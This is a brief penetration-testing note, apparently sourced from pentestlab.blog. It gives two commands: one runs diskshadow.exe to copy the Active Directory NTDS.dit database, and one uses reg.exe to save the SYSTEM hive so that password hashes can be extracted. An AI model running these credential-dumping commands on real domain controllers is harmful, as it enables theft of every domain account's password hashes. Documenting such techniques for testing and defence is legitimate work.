# Use DiskShadow to copy NTDS.dit

Comes from https://pentestlab.blog/tag/ntds-dit/

To copy the NTDS.dit file to C:\Windows\temp, run:

diskshadow.exe /s c:\windows\temp\diskshadow.txt

If you plan to extract password hashes from ntds.dit, you will also get a dump of SYSTEM from the registry:

reg.exe save hklm\system c:\windows\temp\reg.bak
